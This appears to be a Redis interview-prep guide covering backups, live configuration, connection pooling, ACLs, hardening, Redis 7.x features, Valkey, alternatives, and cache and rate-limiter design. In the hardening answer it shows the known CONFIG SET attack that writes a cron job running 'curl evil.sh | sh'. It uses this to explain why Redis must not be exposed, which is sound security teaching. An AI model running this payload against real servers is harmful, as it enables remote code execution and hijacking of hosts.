### Q8. How do you back up Redis in production?

Two mechanisms, ideally combined:

- **RDB snapshot** — the `dump.rdb` file is a self-contained point-in-time snapshot. Trigger `BGSAVE` (or rely on `save` rules), then **copy the RDB off-box** — to object storage, another host, wherever. The file is portable; you can restore by dropping it in `dir` and restarting.
- **AOF** — the append-only log gives near-point-in-time recovery (up to the last fsync). Copy it alongside the RDB.

The operational refinements: run the snapshot **on a replica**, not the master, so the `fork()` pause and IO don't hit production traffic; use filesystem/volume snapshots (EBS, LVM) for large datasets to avoid a long copy; and **test restores** — an untested backup is a hope, not a backup. Managed services (ElastiCache, MemoryDB) automate snapshots, but the "copy it somewhere else" discipline still applies.

### Q9. How do you change Redis configuration on a live server?

Most parameters are changeable at runtime without a restart:

```bash
CONFIG GET maxmemory
CONFIG SET maxmemory 4gb
CONFIG SET maxmemory-policy allkeys-lru
CONFIG GET save
CONFIG REWRITE          # persist current live config back into redis.conf
```

`CONFIG SET` applies immediately but is **in-memory only** — it's lost on restart. `CONFIG REWRITE` writes the running configuration back into the `redis.conf` file so it survives a restart. The workflow: make the live change, verify it, then `CONFIG REWRITE` (or update your config-management source of truth) so you don't get surprised by the old value after the next restart. A few settings (e.g. certain networking ones) still require a restart; `CONFIG SET` will tell you if it can't apply one.

### Q10. How should applications manage Redis connections?

**Pool and reuse connections — never open one per request.** Opening a TCP connection (plus TLS handshake and AUTH) per operation adds latency, burns CPU, and marches `connected_clients` toward `maxclients`, at which point Redis returns `rejected_connections` and your app starts failing.

Practical rules:

- Use your client library's **connection pool**; size it to your concurrency, not your request rate.
- Set sensible client-side **timeouts** (connect + command) so a stalled Redis doesn't hang the whole app.
- Watch `maxclients` (default 10000) headroom; each connection also costs a file descriptor and a small buffer.
- Beware blocking commands (`BLPOP`, `WAIT`) holding a pooled connection for a long time — often you want a separate pool for those.
- In serverless/short-lived environments, connection churn is the classic failure — use a proxy or a client designed for it.

`CLIENT LIST` shows current connections; `INFO clients` gives the counts.

### Q11. Why must you never expose Redis directly to the internet, and how do you lock it down?

Because a reachable, unauthenticated Redis is **remote code execution**. Anyone who can send commands can do:

```bash
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n* * * * * curl evil.sh | sh\n"
SAVE
```

...and Redis writes an attacker-controlled cron job (or SSH `authorized_keys`, or a webshell) to disk as whatever user it runs as. This is not theoretical — mass crypto-mining campaigns have owned tens of thousands of open Redis instances exactly this way.

Defense in depth:

- **Network** — bind to localhost or a private interface (`bind 127.0.0.1 10.0.0.5`), firewall the port, keep `protected-mode yes`. Never `bind 0.0.0.0` on a public IP.
- **Auth** — set `requirepass` and/or ACL users; require AUTH.
- **TLS** — enable TLS for client and replication traffic on untrusted networks.
- **Least privilege** — run Redis as a **non-root** user so a write-primitive can't clobber system files.
- **Neuter dangerous commands** — `rename-command CONFIG ""`, disable `FLUSHALL`/`KEYS`/`DEBUG` where not needed.

### Q12. What are Redis ACLs and how do they improve on `requirepass`?

`requirepass` sets a single shared password for the implicit `default` user, who can run *everything*. ACLs (Redis 6+) let you define **named users with scoped permissions** — per-command and per-key.

```bash
ACL SETUSER appcache on >s3cr3t ~cache:* +get +set +del +expire
ACL SETUSER analytics on >othersecret ~stats:* +@read
ACL SETUSER default off        # disable the all-powerful default user
ACL LIST
ACL WHOAMI
```

Here `appcache` can only touch `cache:*` keys and only run `GET`/`SET`/`DEL`/`EXPIRE`; it can't `FLUSHALL`, can't `CONFIG`, can't read other keyspaces. `+@read` grants command *categories*. This gives you least-privilege per service and blast-radius reduction: a leaked app credential can't reconfigure the server or wipe the database. Best practice is to **disable the `default` user** and give every client its own scoped ACL user, with ACLs defined in `redis.conf`/`aclfile` under config management.

### Q13. How do you disable or rename dangerous commands?

Use `rename-command` in `redis.conf` to rename a command to something unguessable, or to `""` to disable it entirely:

```bash
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command CONFIG "CONFIG_9f3a1c"
rename-command KEYS ""
rename-command DEBUG ""
```

This blunts the CONFIG-SET-dir attack and stops an app bug or a fat-fingered operator from `FLUSHALL`-ing production. With ACLs (Redis 6+) the cleaner approach is per-user command restrictions (`-@dangerous`, `-flushall`), so you can keep the commands available to an admin user but deny them to app users. `rename-command` is blunt and global; ACLs are scoped and preferred going forward, but plenty of hardened deployments still disable `FLUSHALL`/`KEYS`/`DEBUG` outright.

### Q14. How do you inspect and manage client connections?

The `CLIENT` command family:

```bash
CLIENT LIST                       # every connection: id, addr, age, idle, last cmd
CLIENT INFO                       # info about the current connection
CLIENT KILL ID 42                 # forcibly close a connection
CLIENT KILL ADDR 10.0.0.9:53112
CLIENT NO-EVICT on                # exempt this connection from eviction under memory pressure
CLIENT SETNAME worker-3           # label a connection for easier debugging
```

`CLIENT LIST` is how you find the misbehaving client — a connection stuck running `MONITOR`, one that's been idle forever, or the source of a flood. `CLIENT KILL` closes it. `CLIENT NO-EVICT`/`CLIENT NO-TOUCH` control how a connection interacts with memory pressure. Naming connections (`CLIENT SETNAME`) makes `CLIENT LIST` readable when you're staring at 500 connections trying to find the one hammering a hot key.

### Q15. How does `maxmemory` plus an eviction policy act as an operational safety net?

Without a memory cap, an unbounded keyspace grows until the OS OOM-killer terminates Redis — the worst possible failure. `maxmemory` plus an eviction policy converts that hard crash into graceful degradation:

```bash
CONFIG SET maxmemory 4gb
CONFIG SET maxmemory-policy allkeys-lru
```

For a **cache**, `allkeys-lru` (or `allkeys-lfu`) means that when full, Redis evicts the least-recently/frequently-used keys and keeps serving — you lose cold cache entries, not availability. The dangerous default is `noeviction`: when full, writes get `OOM command not allowed` errors while reads still work — appropriate when Redis is a **datastore** (you'd rather reject writes than silently drop data), catastrophic when it's silently your cache and nobody set TTLs. So the safety net is deliberate: set `maxmemory` below the box's RAM (leaving headroom for fork COW), and pick the policy that matches whether this instance is a cache (evict) or a store (reject).

### Q16. Walk me through how you'd monitor and secure a Redis deployment.

**Monitoring — the checklist I'd wire up:**

- Scrape `INFO` into your metrics system; alert on memory % of `maxmemory`, `evicted_keys` rate, hit rate drop, `rejected_connections`, persistence status != ok, replica `master_link_status`/lag, `blocked_clients`, and single-core CPU saturation.
- Keep `SLOWLOG` at ~10ms and `latency-monitor-threshold` set; `LATENCY DOCTOR` in the runbook as first triage.
- Run `--bigkeys`/`--memkeys` periodically to catch outsized keys before they cause spikes.
- Snapshot backups on a replica, copied off-box, restores tested.
- `MONITOR` only for ad-hoc debugging, briefly, ideally on a replica.

**Securing — defense in depth:**

- Never expose the port: `bind` to private interfaces, firewall it, `protected-mode yes`.
- Every client authenticates via a **scoped ACL user**; disable the `default` user; secrets in a vault, not in code.
- TLS for client + replication traffic on untrusted networks.
- Run as **non-root**; disable/rename `FLUSHALL`/`CONFIG`/`KEYS`/`DEBUG` or deny them via ACL.
- `maxmemory` + a policy matched to cache-vs-store so memory pressure degrades gracefully instead of OOM-killing.
- Patch/upgrade on a cadence; know the CVE history of unauthenticated Redis compromises.

The one-liner: **observe the event loop and the memory ceiling; assume the network is hostile and authenticate everyone.**

## Redis 7.x, Ecosystem & Alternatives

### Summary

**What this topic covers**

The modern Redis landscape beyond the core: what shipped in Redis 7.x, the module ecosystem that turns Redis into a multi-model database, the 2024 licensing rupture and the **Valkey** fork, managed offerings, and the competitive field — Memcached, KeyDB, DragonflyDB, MemoryDB, and in-memory grids. This is the "are you current?" topic. Three concern areas: (1) **Redis 7.x features** — Functions vs EVAL, ACL selectors, RESP3 and client-side caching, sharded Pub/Sub, multi-part AOF. (2) **Redis Stack / modules** — RedisJSON, RediSearch (including vector similarity for AI/RAG), RedisTimeSeries, RedisBloom. (3) **The ecosystem and the competition** — the Valkey fork and licence story, ElastiCache/MemoryDB/Redis Cloud, and when Memcached / KeyDB / DragonflyDB / a durable store / Kafka is the better call. The 15 questions here test whether you've kept up since Redis 6, and whether you know Redis's *boundaries*.

**Mental model**

Think of "Redis" today as three concentric rings. The **core** is the single-threaded data-structure server you already know. Around it, **Redis Stack modules** bolt on secondary indexing, JSON, time-series, and probabilistic structures — turning a cache into a multi-model database, and (via RediSearch vector search) into a vector store for AI. Around *that* is the **ecosystem and governance** layer: who owns the code (Redis Inc. vs the Valkey/Linux Foundation fork), who runs it for you (ElastiCache, MemoryDB, Redis Cloud), and who competes with it (Memcached for dumb-fast caching, KeyDB/DragonflyDB for multi-core throughput, Kafka for real event streaming, a real database for durable primary storage). The senior instinct is to hold two ideas at once: Redis is astonishingly versatile *and* it is not the right answer for a primary durable store larger than RAM, complex relational queries, or a real message bus. Knowing the edges is the signal.

**Key terms**

- **Redis Functions** — server-side function libraries (Redis 7) that persist and replicate, unlike ephemeral `EVAL` scripts.
- **RESP3** — the version 3 wire protocol; richer types and the enabler for client-side caching.
- **Client-side caching / tracking** — the server tracks which keys a client cached and pushes invalidations, letting clients keep a local copy of hot keys.
- **RediSearch** — a module providing secondary indexes, full-text search, and **vector similarity (ANN)** search over Redis.
- **RedisJSON** — a module to store and query JSON documents with JSONPath.
- **RedisBloom** — probabilistic structures: Bloom/Cuckoo filters, count-min sketch, top-k.
- **Valkey** — the Linux Foundation fork of the last BSD Redis (7.2.4), backed by AWS/Google/Oracle after Redis's 2024 licence change.
- **SSPL / RSALv2** — the source-available licences Redis Inc. adopted in 2024 (not OSI-approved).
- **ElastiCache** — AWS's managed Redis/Valkey cache service.
- **MemoryDB** — AWS's durable, Multi-AZ, Redis-compatible *primary database* (strong durability via a distributed log).
- **Memcached** — a multi-threaded, pure-LRU cache with no persistence or rich types.
- **DragonflyDB** — a modern multi-threaded, Redis/Memcached-compatible rewrite claiming much higher per-node throughput.

**Why interviewers ask this**

It's a currency check. Anyone can describe `SET`/`GET`; fewer can explain what changed since Redis 6, and fewer still can narrate the Valkey licensing saga and its strategic implications for a team choosing a dependency in 2026. The licence question is a genuine senior signal — it's about supply-chain and vendor risk, not syntax. The alternatives question tests judgment: a candidate who reaches for Redis reflexively for everything is less valuable than one who says "for a pure LRU cache that needs to saturate 32 cores, Memcached or DragonflyDB may beat single-threaded Redis." And the modules/vector-search angle is increasingly asked because RAG systems use Redis as a vector store — knowing RediSearch's ANN capability is now mainstream backend knowledge.

**Common confusions**

- "Redis is still BSD/open source." Mixed. Redis Inc. moved to source-available SSPL/RSALv2 in 2024, then re-added an OSS (AGPL) option in 2025; Valkey remains BSD. Know the timeline.
- "Valkey is a different product." It's a near drop-in fork of Redis 7.2, wire- and API-compatible, actively developed.
- "Functions are just saved EVAL scripts." Functions are first-class, persisted, replicated libraries; `EVAL` scripts are ephemeral and must be re-loaded.
- "Redis is multi-threaded now." The *command execution* core is still single-threaded; Redis 6 added I/O threads for network only. KeyDB/DragonflyDB are the multi-threaded rewrites.
- "MemoryDB is just ElastiCache." No — MemoryDB is a *durable primary database* with a Multi-AZ transaction log; ElastiCache is a cache.
- "Memcached is obsolete." It's simpler, multi-threaded, and for a pure cache it's a perfectly good, sometimes better, choice.

**What follows from this topic**

The vector-search capability connects Redis to the AI/embeddings world (RAG stores). The Valkey/licensing story feeds architectural and vendor-selection decisions. The alternatives comparison sets up **Scenario & Playbooks**, where "would you even use Redis here?" is a recurring judgment call — several playbook scenarios end with "...and this is where you'd reach for Streams, or Kafka, or MemoryDB instead." Knowing the ecosystem is what lets you give the *right-sized* answer instead of forcing every problem onto the core.

### Q1. What are the notable features introduced in Redis 7.x?

The headliners:

- **Redis Functions** — server-side function libraries that are *persisted and replicated* as part of the dataset, replacing the ephemeral-`EVAL`-script model for durable server-side logic.
- **ACL improvements / selectors** — more granular access control, including selectors that grant different permissions for different key patterns within one user.
- **RESP3 + client-side caching (tracking)** — the protocol and mechanism that let clients cache hot keys locally and get server-pushed invalidations.
- **Sharded Pub/Sub** (`SPUBLISH`/`SSUBSCRIBE`) — Pub/Sub that respects Cluster sharding instead of broadcasting to every node.
- **Multi-part AOF** — the AOF is split into a base RDB snapshot plus incremental files, making rewrites cheaper and more robust.
- **Command and memory improvements** — new commands (`OBJECT FREQ`, expanded `EXPIRE` flags `NX`/`XX`/`GT`/`LT`, `SINTERCARD`, `LMPOP`/`ZMPOP`), and listpack encoding replacing ziplist.

The theme is durability of server-side logic (Functions), efficiency (multi-part AOF, listpacks, sharded Pub/Sub), and latency (client-side caching).

### Q2. What are Redis Functions and how do they differ from EVAL scripts?

Both run Lua atomically on the server, but the lifecycle differs fundamentally.

| | `EVAL` scripts | Functions (7.0+) |
|---|---|---|
| Persistence | Ephemeral — live in a script cache, lost on restart/flush | Persisted with the dataset (RDB/AOF) |
| Replication | Effect replicated; script itself must be re-loaded | Library replicated to replicas |
| Organization | One script blob | Named **libraries** with multiple named functions |
| Invocation | `EVALSHA <sha>` | `FCALL <funcname>` |
| Reload burden | App must handle `NOSCRIPT` and re-`SCRIPT LOAD` | Loaded once via `FUNCTION LOAD` |

```bash
FUNCTION LOAD "#!lua name=mylib
redis.register_function('myfunc', function(keys, args)
  return redis.call('INCR', keys[1])
end)"
FCALL myfunc 1 counter:1
```

Functions solve the operational pain of `EVAL`: no more `NOSCRIPT` handling, no re-loading after failover, and server-side logic is a first-class, versioned, replicated part of the deployment. Use Functions for durable atomic logic; `EVAL` is still fine for one-off ad-hoc atomic ops.

### Q3. What is RESP3 and client-side caching?

**RESP3** is version 3 of the Redis wire protocol (opt-in via `HELLO 3`). It adds richer reply types (maps, sets, doubles, booleans, push messages) so clients don't have to guess structure, and — crucially — a **push** channel the server can use to send unsolicited messages.

That push channel enables **client-side caching (tracking)**: the client keeps a local in-process copy of hot keys, and the server *tracks* which keys each client has cached and pushes an **invalidation** message when one changes.

```bash
CLIENT TRACKING on
GET product:42     # client caches value locally; server notes interest
# when product:42 changes elsewhere, server pushes an invalidation
```

The win is latency and load: reads of hot, rarely-changing keys are served from the app's local memory (nanoseconds, zero network round-trip), and correctness is preserved because the server invalidates the moment the key changes. It's effectively a coherent L1 cache in front of Redis's L2, and it's a big win for read-heavy hot-key workloads.

### Q4. What is Redis Stack and what do the main modules do?

Redis Stack bundles the core plus official modules that make Redis multi-model:

- **RedisJSON** — store native JSON documents and query/update them by **JSONPath** (`JSON.SET`, `JSON.GET user:1 $.address.city`), instead of serializing JSON into a string.
- **RediSearch** — a secondary-index engine over Redis hashes/JSON: full-text search, numeric/tag filters, aggregations, and **vector similarity (ANN)** search — the piece that makes Redis a vector store for embeddings/RAG.
- **RedisTimeSeries** — a time-series type with retention, downsampling, and aggregation rules — for metrics/IoT.
- **RedisBloom** — probabilistic structures: Bloom and Cuckoo filters (set membership in tiny space), count-min sketch (frequency), top-k.

Together they turn Redis from a cache/KV store into a document + search + time-series + probabilistic database, all in-memory and fast. The tradeoff is that modules add operational surface and aren't part of the minimal core (and their licensing follows Redis Inc.'s terms, which matters post-2024).

### Q5. How is Redis used as a vector database for AI/RAG?

Via **RediSearch's vector similarity search**. You store embedding vectors (from an LLM/embedding model) as fields on Redis hashes or JSON docs, build a vector index, and run approximate-nearest-neighbor (ANN) queries.

```bash
# create an index with a vector field (HNSW), 1536 dims, cosine distance
FT.CREATE idx ON HASH PREFIX 1 doc: SCHEMA embedding VECTOR HNSW 6 TYPE FLOAT32 DIM 1536 DISTANCE_METRIC COSINE

# query: k nearest neighbors to a query embedding
FT.SEARCH idx "*=>[KNN 5 @embedding $vec]" PARAMS 2 vec <blob> DIALECT 2
```

This is directly relevant to **RAG** (retrieval-augmented generation): you embed your documents, store them in Redis, and at query time embed the user's question and pull the top-k most similar chunks to feed the LLM. Redis's appeal here is that it's already in many stacks as a cache, it's in-memory fast for low-latency retrieval, and it supports HNSW/FLAT indexes with metadata filtering — so you can combine vector similarity with tag/numeric filters in one query. The catch is memory cost (vectors are large and RAM-resident) and that dedicated vector DBs may scale further for huge corpora.

### Q6. What are RedisBloom's probabilistic structures for?

They trade a little accuracy for enormous space savings on membership/frequency questions:

- **Bloom filter** — "have I seen this before?" with no false negatives and tunable false positives, in a fraction of the memory of a real set. Classic uses: dedup, cache-penetration guards ("is this ID even valid?" before hitting the DB), seen-URL sets.
- **Cuckoo filter** — like a Bloom filter but supports deletion.
- **Count-min sketch** — approximate frequency counts for a stream (how many times did X appear?) in fixed memory.
- **Top-K** — track the K most frequent items in a stream (heavy hitters) without storing all items.

```bash
BF.ADD seen:users user:123
BF.EXISTS seen:users user:999   # 0 = definitely not seen; 1 = probably seen
```

The point: for billions of items where an exact set would blow memory, these give you a correct-enough answer in kilobytes. The Bloom-filter-as-cache-penetration-guard is a favorite interview example.

### Q7. What happened with Redis's licensing, and what is Valkey?

In **March 2024**, Redis Inc. changed the core Redis licence from the permissive **BSD** to **source-available** dual SSPL / RSALv2 — not OSI-approved open source, aimed at stopping cloud providers from selling managed Redis without contributing back.

In response, the community — with the **Linux Foundation** and backing from **AWS, Google, Oracle** and others — forked the last BSD version (Redis 7.2.4) as **Valkey**. Valkey is a near **drop-in** replacement: same protocol, same commands, same client compatibility, but genuinely open source (BSD) and independently, actively developed (it's added its own improvements since). AWS ElastiCache and GCP Memorystore now offer Valkey; many teams have adopted it to avoid the licensing risk.

A later twist: in **2025** Redis Inc. added back an OSI-approved **AGPLv3** option for the core, partly to win developers back. So as of 2026 you have Redis (dual SSPL/RSALv2/AGPL) and Valkey (BSD) as the two main lineages. Every senior should know this story because it's a real dependency/vendor-risk decision, not trivia.

### Q8. What managed Redis options exist, and how do they differ?

| Service | What it is |
|---|---|
| **AWS ElastiCache** (Redis/Valkey) | Managed cache — the standard "run Redis for me" option; snapshots, failover, Cluster mode. |
| **AWS MemoryDB** | A **durable primary database** that's Redis-compatible; Multi-AZ, backed by a distributed transaction log for strong durability. |
| **Redis Cloud** | Redis Inc.'s own managed service; latest features, modules, active-active geo-replication. |
| **Azure Cache for Redis** | Microsoft's managed offering. |
| **GCP Memorystore** | Google's managed Redis/Valkey. |

The key distinction is **ElastiCache vs MemoryDB**. ElastiCache is a *cache* — fast, replicated, but with the usual async-replication data-loss window; you treat it as disposable. **MemoryDB** is Redis-as-a-*database*: every write is committed to a distributed multi-AZ log before ack, so it survives node failure with no data loss — durable enough to be a primary store, at higher write latency and cost. So: MemoryDB when you want Redis's data model *and* durability guarantees; ElastiCache/others when it's a cache and the source of truth lives elsewhere.

### Q9. Redis vs Memcached — when would you pick Memcached?

| | Redis | Memcached |
|---|---|---|
| Data types | Rich (hash, list, set, ZSET, stream...) | Strings/blobs only |
| Threading | Single-threaded core (+ I/O threads) | **Multi-threaded** — scales across cores |
| Persistence | RDB + AOF | None (pure cache) |
| Replication/HA | Sentinel, Cluster | None built-in |
| Eviction | Multiple policies | LRU only |
| Extras | Pub/Sub, Lua, modules, transactions | Just get/set/incr |

Reach for **Memcached** when you want exactly one thing — a **simple, pure, multi-core object cache** — and none of Redis's richer features. Its multi-threaded design can push more raw get/set throughput per box on a big multi-core machine for a flat key-value cache, its memory model (slab allocator) is predictable, and its simplicity means less to operate and misconfigure. Choose **Redis** the moment you need data structures, persistence, replication/HA, atomic server-side logic, or pub/sub — which is most of the time, which is why Redis dominates. But "just cache these blobs, saturate the cores, nothing fancy" is a legitimate Memcached case.

### Q10. What are KeyDB and DragonflyDB?

Both attack Redis's single-threaded-core limitation:

- **KeyDB** — a fork of Redis that made the core **multi-threaded** while staying Redis-protocol-compatible, so it can use multiple cores on one node. It also added features like active-active replication. (KeyDB's momentum faded after its company was acquired.)
- **DragonflyDB** — a from-scratch **rewrite**, Redis- *and* Memcached-compatible on the wire, built on a modern shared-nothing multi-threaded architecture. It claims dramatically higher throughput per node (millions of ops/sec) and better memory efficiency, letting a single Dragonfly node replace a Redis Cluster in some cases.

The pitch for both is the same: you love the Redis API but you're bottlenecked on one core and don't want to run a multi-node Cluster just to use your machine's CPUs. The counter-argument is maturity, ecosystem, and that Redis's single-threaded model is a *feature* for atomicity simplicity. Bringing up Dragonfly in an interview signals you're tracking the "should Redis be multi-threaded?" debate.

### Q11. What's the multi-threading debate around Redis?

Redis's core deliberately executes commands **single-threaded** on one event loop. The upside: every command is atomic for free, there's no lock contention, and the code is simple and predictable. The downside: one CPU core is the throughput ceiling per instance, and one slow O(N) command blocks *everyone*.

Redis's answer has been (a) I/O threads (Redis 6) to parallelize *network* read/write while keeping command execution single-threaded, and (b) **Cluster** — shard across many single-threaded instances to use many cores. Critics (KeyDB, DragonflyDB) argue that in the many-core era, forcing operators to run a multi-node Cluster on a single big machine just to use its CPUs is wasteful, and that a multi-threaded core (shared-nothing per-shard, as Dragonfly does) can deliver Redis semantics at far higher per-node throughput. The counter is that single-threaded simplicity is why Redis is so bug-free and predictable, and Cluster already solves horizontal scale. There's no universal winner — it's a throughput-per-node vs simplicity tradeoff.

### Q12. When should you NOT use Redis?

Redis is a hammer; these are not nails:

- **Primary store for data larger than RAM.** Redis is memory-resident; if your dataset dwarfs affordable RAM, a disk-based database (Postgres, Cassandra, DynamoDB) is the right primary store, with Redis as a cache in front.
- **Complex relational/ad-hoc queries.** No joins, no rich query planner. Multi-way relationships and analytical queries belong in a relational or analytical database.
- **Strong durability as a primary DB (without MemoryDB).** Vanilla Redis's async replication + snapshot model has data-loss windows. If losing seconds of committed writes is unacceptable and you can't use MemoryDB, use a database built for durability.
- **A real message bus / event log at scale.** Redis Streams is Kafka-lite; for high-throughput, long-retention, multi-consumer event streaming, use **Kafka**.
- **When Memcached's simplicity suffices.** If you truly just need a dumb multi-core blob cache, the extra Redis surface isn't buying you anything.

The senior framing: Redis **complements** the primary datastore (cache, ephemeral state, rate limits, queues, leaderboards); it rarely **replaces** it.

### Q13. Redis vs a durable database vs Kafka — how do you choose?

Match the tool to the job:

- **Redis** — low-latency in-memory access, ephemeral or cache-of-record state, rich data structures, atomic counters/locks/leaderboards. The source of truth usually lives elsewhere.
- **A durable database** (Postgres/Cassandra/DynamoDB, or MemoryDB) — the **system of record**: durable, queryable, larger-than-RAM, the data you can't afford to lose.
- **Kafka** (or Pulsar) — a **durable, replayable event log** with high throughput, long retention, and consumer groups at scale — the backbone for event streaming, CDC, and decoupling services.

The overlaps that trip people up: Redis Streams *looks* like Kafka but is memory-bound and retention-limited — fine for a work queue or modest event fan-out, wrong for a company-wide event backbone. Redis *can* persist but isn't the store you bet the business on. So the pattern in a real system is often all three: Kafka as the event backbone, a durable DB as the system of record, and Redis as the low-latency cache/state layer in front of it.

### Q14. "Redis vs Memcached, and what's Valkey?" — give the crisp answer.

**Redis vs Memcached:** Both are in-memory caches. Memcached is a simpler, multi-threaded, pure-LRU blob cache with no persistence or rich types — great when you want exactly that and want to saturate many cores. Redis is a *data-structure server* — strings, hashes, lists, sets, sorted sets, streams — with persistence, replication, HA (Sentinel/Cluster), Lua/Functions, pub/sub, and modules. You pick Memcached for a dead-simple multi-core cache; you pick Redis (the default) the moment you need structures, durability, HA, or server-side atomic logic.

**What's Valkey:** When Redis Inc. moved the core off the permissive BSD licence to source-available SSPL/RSALv2 in 2024, the community forked the last BSD release under the Linux Foundation as **Valkey**, backed by AWS/Google/Oracle. It's a near drop-in, wire-compatible, genuinely open-source (BSD), actively developed alternative — now offered by major clouds. Redis later re-added an AGPL open-source option. So today "Redis" effectively names two compatible lineages, and Valkey is the OSS-governance-safe one.

### Q15. Where is Redis heading?

A few durable directions worth naming:

- **Two compatible lineages.** Redis Inc. (with modules, Redis Cloud, active-active) and Valkey (BSD, Linux Foundation, cloud-backed) will coexist and stay largely wire-compatible; the licensing détente (Redis re-adding AGPL in 2025) reduced but didn't erase the fork.
- **Multi-model / AI.** RediSearch vector search positions Redis as a low-latency vector store for RAG; expect continued investment in search, JSON, and AI-adjacent features.
- **The multi-threading pressure.** DragonflyDB/KeyDB keep pushing on per-node throughput; both Redis and Valkey are exploring more parallelism (Valkey has shipped multi-threading work) while guarding single-threaded atomicity semantics.
- **Managed + durable.** MemoryDB-style durable Redis-compatible databases blur the cache/DB line; more workloads will run Redis-as-a-database.
- **Client-side caching (RESP3)** maturing as a standard latency win.

The senior takeaway: Redis is evolving from "the cache" into a multi-model, sometimes-durable, sometimes-multi-threaded data platform — while the governance split means you now *choose a lineage*, not just a version.

## Scenario & Playbooks

### Summary

**What this topic covers**

The capstone: applied Redis judgment. Not "what does `ZADD` do" but "design a rate limiter," "someone ran `KEYS *` and froze prod — what happened and how do you fix it," "we lost data after a failover — why." Two question types dominate. (a) **Design scenarios** — cache layer, rate limiter, leaderboard, session store, job queue, distributed lock, real-time analytics, autocomplete — where the answer is a concrete choice of data structure + commands + the reasoning and tradeoffs. (b) **Anti-pattern / diagnosis scenarios** — a `KEYS *` freeze, a p99 spike, an OOM/eviction storm, a low hit rate, data loss on failover, a hot key, cache/DB inconsistency, a broken distributed lock, lost Pub/Sub messages — where the answer names the anti-pattern, gives the fix with commands/config, and explains the *why*. The 17 questions here are the definitive Redis design-and-troubleshooting reference; they assume everything from the earlier topics.

**Mental model**

Every Redis scenario answer is assembled from six recurring principles, and interviewers are checking whether you apply them reflexively:

1. **Pick the data structure for the access pattern** — leaderboard → ZSET, queue → list/Stream, counter → INCR, unique-count → HyperLogLog, membership → set/Bloom. The structure *is* the design.
2. **Set TTLs and an eviction policy** — nothing lives forever; decide expiry and what happens under memory pressure up front.
3. **Keep commands O(1)/O(log N) and never block the single thread** — the whole latency story reduces to this.
4. **Use Lua/Functions for atomic compound operations** — read-modify-write across keys must be atomic or you have a race.
5. **Know the data-loss windows** — async replication and snapshot/AOF gaps mean Redis can lose recent writes; design around it (or use `WAIT`/MemoryDB).
6. **Redis complements the primary DB** — it's the fast layer, rarely the source of truth.

Run any scenario through those six and the answer writes itself. Diagnosis is the same six in reverse: a symptom almost always violates one of them.

**Key terms**

- **Cache-aside (lazy loading)** — app checks cache, on miss reads DB and populates cache; the default caching pattern.
- **Cache stampede / thundering herd** — many requests miss simultaneously (e.g. a hot key expires) and all hammer the DB at once.
- **Fixed-window vs sliding-window rate limiting** — counter-per-window (`INCR`) vs timestamp-set-in-a-window (ZSET); tradeoff of accuracy vs cost.
- **Reliable queue** — a queue where an item isn't lost if the worker crashes mid-processing (`LMOVE` to a processing list, or Streams consumer groups).
- **Fencing token** — a monotonically increasing number a lock hands out so a stale lock holder's writes can be rejected.
- **`UNLINK`** — non-blocking `DEL`; frees the key's memory in a background thread.
- **`WAIT`** — blocks until N replicas ack, shrinking the replication data-loss window.
- **Hot key** — a single key so frequently accessed it bottlenecks one thread/node even under sharding.
- **Big key** — an aggregate large enough that O(N) operations on it stall the event loop.

**Why interviewers ask this**

This is where they find out if you can actually *build* with Redis under real constraints, or only recite features. The design questions reveal whether you reach for the right structure and remember the un-sexy parts — TTLs, stampede protection, invalidation, atomicity. The diagnosis questions reveal production scars: someone who's been paged for a `KEYS *` freeze or a fork-induced p99 spike answers instantly and specifically, while someone who's only read docs flounders. The distributed-lock and failover-data-loss questions are deliberate traps that separate people who know the *correctness caveats* (lock expiry vs work duration, async replication loss window, Redlock critique) from people who assume Redis "just works." A strong showing here is the difference between "knows Redis" and "can be trusted to design with Redis."

**Common confusions**

- "Redis is fast so latency spikes must be the network." Often it's a fork pause, a big-key O(N), swap, or a giant `DEL` — check `SLOWLOG`/`LATENCY` first.
- "`SET NX` gives me a safe distributed lock." Only with a random token + Lua compare-and-delete release, and even then it's not safe for correctness-critical mutual exclusion without fencing.
- "The cache expired, so of course we hit the DB." A stampede is *many* simultaneous misses on the same hot key — you need single-flight/lock or jitter, not just a TTL.
- "Pub/Sub delivers my events." Pub/Sub is at-most-once fire-and-forget; a disconnected subscriber loses messages. Use Streams for anything you can't lose.
- "Cluster fixes hot keys." Cluster shards by key, so a single hot key still lands on one node — you need client-side caching or key-splitting.

**What follows from this topic**

Nothing — this is the synthesis. It pulls the data structures, persistence/replication, memory, HA, and ops-and-security topics into applied answers. If you can walk through these 17 scenarios fluently — naming the structure, the commands, the TTL/eviction decision, the atomicity concern, and the failure mode — you can handle essentially any Redis system-design or debugging question an interview throws at you.

### Q1. Design a cache layer for a read-heavy service.

Start with **cache-aside (lazy loading)** — the default:

```bash
# read path (pseudocode)
val = GET user:123
if val == nil:
    val = db.query("...")
    SET user:123 <val> EX 300     # populate with a TTL
return val
```

Then layer in the parts juniors forget:

- **TTL** — every entry expires (`EX`), so stale data self-heals and cold data ages out. Pick TTL from tolerance for staleness.
- **Invalidation on write** — when the DB row changes, `DEL user:123` (or update it) so reads don't serve stale data.
- **Stampede protection** — for hot keys, add **jitter** to TTLs so they don't all expire together, and/or a single-flight lock so only one request rebuilds the value on a miss (see Q10).
- **Eviction policy** — `maxmemory` + `allkeys-lru`/`lfu` so memory pressure degrades gracefully.
- **Hot keys** — consider RESP3 client-side caching for the hottest, rarely-changing keys.

The reasoning: reads hit RAM (sub-millisecond), the DB is shielded, and correctness is maintained by TTL + invalidation. Redis is the fast layer; the DB stays the source of truth.

### Q2. Design a rate limiter.

Three standard designs, increasing in accuracy and cost:

**Fixed-window** — one counter per window, cheap, O(1):

```bash
# key includes the window bucket, e.g. rl:user:123:1690000060
INCR rl:user:123:<window>
EXPIRE rl:user:123:<window> 60   # only needed on first INCR
# reject if value > limit
```

Simple, but allows a burst of up to 2× the limit at a window boundary.

**Sliding-window** with a ZSET — accurate, O(log N):

```bash
ZADD rl:user:123 <now_ms> <unique_req_id>
ZREMRANGEBYSCORE rl:user:123 0 <now_ms - 60000>   # drop old
ZCARD rl:user:123                                  # count in window
EXPIRE rl:user:123 60
```

Precise rolling window, at the cost of storing a timestamp per request.

**Token bucket** via Lua — smooth rate + burst allowance, atomic:

Store tokens + last-refill timestamp in a hash and refill in a Lua script so the read-modify-write is atomic. Best for "N per second with a burst of B."

Tradeoff summary: fixed-window is cheapest but boundary-bursty; sliding-window ZSET is accurate but heavier; token bucket gives smooth shaping. Whichever you pick, do the check **atomically** (single command or Lua) so concurrent requests can't race past the limit.

